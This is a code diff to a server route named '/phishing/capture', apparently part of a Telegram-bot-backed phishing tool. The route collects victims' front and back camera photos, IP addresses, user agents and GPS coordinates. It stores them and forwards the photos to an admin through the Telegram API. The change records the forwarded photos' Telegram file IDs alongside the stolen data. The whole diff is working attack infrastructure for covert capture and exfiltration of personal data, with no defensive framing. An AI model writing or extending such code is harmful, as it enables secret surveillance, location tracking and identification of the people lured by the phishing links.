@@ -100,6 +100,8 @@ phishing.post("/phishing/capture", async (c) => {
 
   let frontKey = null;
   let backKey = null;
+  let frontFileId = null;
+  let backFileId = null;
   const ts = Date.now();
 
   if (frontPhoto && frontPhoto.size > 0) {
@@ -110,12 +112,6 @@ phishing.post("/phishing/capture", async (c) => {
     backKey = `phishing/${code}/back_${ts}.jpg`;
     await c.env.BUCKET.put(backKey, backPhoto.stream(), { httpMetadata: { contentType: "image/jpeg" } });
   }
-
-  await d1Run(c.env.DB,
-    `INSERT INTO phishing_captures (link_code, telegram_id, ip, user_agent, latitude, longitude, front_photo_key, back_photo_key)
-     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
-    [code, telegramId, ip, ua.slice(0, 500), lat, lng, frontKey, backKey],
-  );
 
   const adminId = c.env.ADMIN_ID;
   const token = c.env.BOT_TOKEN;
@@ -143,7 +139,11 @@ phishing.post("/phishing/capture", async (c) => {
       if (obj) {
         const blob = new Blob([await obj.arrayBuffer()], { type: "image/jpeg" });
         const file = new File([blob], "front.jpg", { type: "image/jpeg" });
-        await sendMediaFile(token, adminId, "photo", file, `🎣 Front cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`);
+        const result = await sendMediaFile(token, adminId, "photo", file, `🎣 Front cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`) as any;
+        if (result?.photo?.length) {
+          const largest = result.photo[result.photo.length - 1];
+          frontFileId = largest.file_id;
+        }
       }
     } catch (e) { console.error("Failed to send front photo:", e); }
   }
@@ -154,10 +154,20 @@ phishing.post("/phishing/capture", async (c) => {
       if (obj) {
         const blob = new Blob([await obj.arrayBuffer()], { type: "image/jpeg" });
         const file = new File([blob], "back.jpg", { type: "image/jpeg" });
-        await sendMediaFile(token, adminId, "photo", file, `🎣 Back cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`);
+        const result = await sendMediaFile(token, adminId, "photo", file, `🎣 Back cam · ${code}${telegramId ? ` · ${telegramId}` : ""}`) as any;
+        if (result?.photo?.length) {
+          const largest = result.photo[result.photo.length - 1];
+          backFileId = largest.file_id;
+        }
       }
     } catch (e) { console.error("Failed to send back photo:", e); }
   }
+
+  await d1Run(c.env.DB,
+    `INSERT INTO phishing_captures (link_code, telegram_id, ip, user_agent, latitude, longitude, front_photo_key, back_photo_key, front_file_id, back_file_id)
+     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
+    [code, telegramId, ip, ua.slice(0, 500), lat, lng, frontKey, backKey, frontFileId, backFileId],
+  );
 
   if (lat && lng) {
     try {
